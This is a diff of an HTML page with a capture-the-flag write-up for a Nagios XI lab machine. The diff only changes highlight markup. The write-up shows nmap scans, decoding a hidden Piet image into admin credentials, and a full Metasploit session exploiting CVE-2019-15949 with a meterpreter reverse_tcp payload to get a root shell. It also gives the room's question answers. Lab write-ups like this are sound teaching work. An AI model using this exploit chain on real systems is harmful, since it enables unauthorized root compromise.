@@ -94,44 +94,44 @@
 </div>
 
       <div class="content"><h2 id="enumeration">Enumeration</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">10000</span> --open 10.10.222.20
-</span></span></code></pre></div><p>Ports open: <code>22</code>, <code>25</code>, <code>80</code>, <code>443</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p- --min-rate <span style="color:#ae81ff">10000</span> --open 10.10.222.20
+</code></pre></div><p>Ports open: <code>22</code>, <code>25</code>, <code>80</code>, <code>443</code></p>
 <p>Moving on to Service Version/TCP scan with vuilnerability detections scripts + OS detection:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p22,25,80,443 -sCVT -O 10.10.222.20   
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-05-04 23:45 EDT
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.222.20
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
-</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>25/tcp  open  smtp     Postfix smtpd
-</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
-</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>ubuntu
-</span></span><span style="display:flex;"><span>| Not valid before: 2020-03-23T23:42:04
-</span></span><span style="display:flex;"><span>|_Not valid after:  2030-03-21T23:42:04
-</span></span><span style="display:flex;"><span>|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
-</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>443/tcp open  ssl/http Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>192.168.85.153/organizationName<span style="color:#f92672">=</span>Nagios Enterprises/stateOrProvinceName<span style="color:#f92672">=</span>Minnesota/countryName<span style="color:#f92672">=</span>US
-</span></span><span style="display:flex;"><span>| Not valid before: 2020-03-24T00:14:58
-</span></span><span style="display:flex;"><span>|_Not valid after:  2030-03-22T00:14:58
-</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">400</span> Bad Request
-</span></span><span style="display:flex;"><span>| tls-alpn: 
-</span></span><span style="display:flex;"><span>|_  http/1.1
-</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
-</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.10 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.18 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.19 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 - 4.9 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">4</span> hops
-</span></span><span style="display:flex;"><span>Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Ubuntu host
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -p22,25,80,443 -sCVT -O 10.10.222.20   
+Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-05-04 23:45 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.222.20
+Host is up <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+25/tcp  open  smtp     Postfix smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>ubuntu
+| Not valid before: 2020-03-23T23:42:04
+|_Not valid after:  2030-03-21T23:42:04
+|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+80/tcp  open  http     Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+443/tcp open  ssl/http Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>192.168.85.153/organizationName<span style="color:#f92672">=</span>Nagios Enterprises/stateOrProvinceName<span style="color:#f92672">=</span>Minnesota/countryName<span style="color:#f92672">=</span>US
+| Not valid before: 2020-03-24T00:14:58
+|_Not valid after:  2030-03-22T00:14:58
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: <span style="color:#ae81ff">400</span> Bad Request
+| tls-alpn: 
+|_  http/1.1
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.10 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.18 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.19 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 - 4.9 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">4</span> hops
+Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Ubuntu host
 Port <code>22</code>(SSH): Version 7.2p2
 Port <code>25</code>: Postfix SMTPd</p>
 <ul>
@@ -146,66 +146,66 @@ Port 443: Same as port 80</li>
 As you can see we found the <code>/nagiosxi</code> path from the source code.</p>
 <p>Also, We see the line &ldquo;Welcome to elements&rdquo; followed by abbreviations from the periodic tables. At first, I didn&rsquo;t even notice this however It didn&rsquo;t occur to me until after I was not able to find anything useful from directory enumeration and SMTP enumeration.</p>
 <p>Using this information, I searched for a list of abbreviations from the periodic tables&hellip;. After writing a short python script with itertools to gather the different combinations and trying directory brute forcing again&hellip; nothin. Damn. After scratching my head for bit and not getting anything back from trying to enumerate SMTP. I came back to the webpage decided to try to convert the Elements listed above to their corresponding element number then convert them to ASCII characters:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;print(&#39;&#39;.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))&#34;</span>
-</span></span><span style="display:flex;"><span>/PI3T.PNg
-</span></span></code></pre></div><p>This brought us to a <code>.png</code> image(name shown above), from here I decided to download so I can try and run <code>exiftools</code> on the image and see if I can&rsquo;t find any useful information etc, as the picture doesn&rsquo;t really give much away. After running the tool, I was able to find the Author of the photo; <code>Artist: Piet Mandrian</code>&hellip;.. Nice!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;print(&#39;&#39;.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))&#34;</span>
+/PI3T.PNg
+</code></pre></div><p>This brought us to a <code>.png</code> image(name shown above), from here I decided to download so I can try and run <code>exiftools</code> on the image and see if I can&rsquo;t find any useful information etc, as the picture doesn&rsquo;t really give much away. After running the tool, I was able to find the Author of the photo; <code>Artist: Piet Mandrian</code>&hellip;.. Nice!</p>
 <p>After a quick google search of <code>piet</code>, one of the first pages was for an <strong>esolang</strong> (esoteric language) called <code>Piet</code>. Piet is described as a stack-based esoteric programming language in which programs look like abstract Paintings. This fits the picture we downloaded, so I then looked up a online translator for Piet.</p>
 <p>After running the image through the interpreter, we successfully got what looks like the <code>admin</code> username/password to then login as, nice!</p>
 <p>After logging in, we are able to see that the Version of the version of Nagios XI in use is version <code>5.5.6</code>.</p>
 <p><strong>CVE-2019–15949</strong>
 Nagios 5.6.6 and prior allows remote command execution as <strong>root</strong>. The exploit requires access to the server as the nagios user. Or access as the admin user via the web interface. The <code>getprofile.sh</code> script invoked by downloading a system profile is executed as root via a passwordless sudo entry; the script executes check_plugin, which is owned by the nagios user. A user logged into NagiosXI with permissions to modify plugins, or the nagios user on the server, can modify the check_plugin executable and inseart malicious commands to execute as root.</p>
 <p>To get root on this machine, you simply need to run the correct metasploit exploit, which if you selected the CVE above&hellip; will give you a shell as root!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfconsole -q
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting persistent handler<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>...
-</span></span><span style="display:flex;"><span>msf5 &gt; search CVE-2019-15949
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Matching Modules
-</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                            Disclosure Date  Rank       Check  Description</span>
-</span></span><span style="display:flex;"><span>   -  ----                                            ---------------  ----       -----  -----------
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/linux/http/nagios_xi_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf5 &gt; use <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>linux/http/nagios_xi_authenticated_rce<span style="color:#f92672">)</span> &gt; show options
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/linux/http/nagios_xi_authenticated_rce<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Name       Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>   PASSWORD                    yes       Password to authenticate with
-</span></span><span style="display:flex;"><span>   Proxies                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>   RHOSTS                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
-</span></span><span style="display:flex;"><span>   RPORT      <span style="color:#ae81ff">80</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-</span></span><span style="display:flex;"><span>   SRVPORT    <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
-</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
-</span></span><span style="display:flex;"><span>   SSLCert                     no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   TARGETURI  /                yes       Base path to NagiosXI
-</span></span><span style="display:flex;"><span>   URIPATH                     no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   USERNAME   nagiosadmin      yes       Username to authenticate with
-</span></span><span style="display:flex;"><span>   VHOST                       no        HTTP server virtual host
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
-</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
-</span></span><span style="display:flex;"><span>   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Exploit target:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   Id  Name
-</span></span><span style="display:flex;"><span>   --  ----
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   Linux <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>linux/http/nagios_xi_authenticated_rce<span style="color:#f92672">)</span> &gt; exploit
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># shell as root!</span>
-</span></span></code></pre></div><h6 id="questions">Questions</h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole -q
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting persistent handler<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>...
+msf5 &gt; search CVE-2019-15949
+
+Matching Modules
+<span style="color:#f92672">================</span>
+
+   <span style="color:#75715e">#  Name                                            Disclosure Date  Rank       Check  Description</span>
+   -  ----                                            ---------------  ----       -----  -----------
+   <span style="color:#ae81ff">0</span>  exploit/linux/http/nagios_xi_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
+
+
+msf5 &gt; use <span style="color:#ae81ff">0</span>
+msf5 exploit<span style="color:#f92672">(</span>linux/http/nagios_xi_authenticated_rce<span style="color:#f92672">)</span> &gt; show options
+
+Module options <span style="color:#f92672">(</span>exploit/linux/http/nagios_xi_authenticated_rce<span style="color:#f92672">)</span>:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RHOSTS                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+   RPORT      <span style="color:#ae81ff">80</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
+   TARGETURI  /                yes       Base path to NagiosXI
+   URIPATH                     no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
+   USERNAME   nagiosadmin      yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options <span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color:#ae81ff">1</span>   Linux <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span>
+
+
+msf5 exploit<span style="color:#f92672">(</span>linux/http/nagios_xi_authenticated_rce<span style="color:#f92672">)</span> &gt; exploit
+<span style="color:#75715e"># shell as root!</span>
+</code></pre></div><h6 id="questions">Questions</h6>
 <p>What hidden file did you find?</p>
 <blockquote>
 <p><code>/PI3T.PNg</code></p>
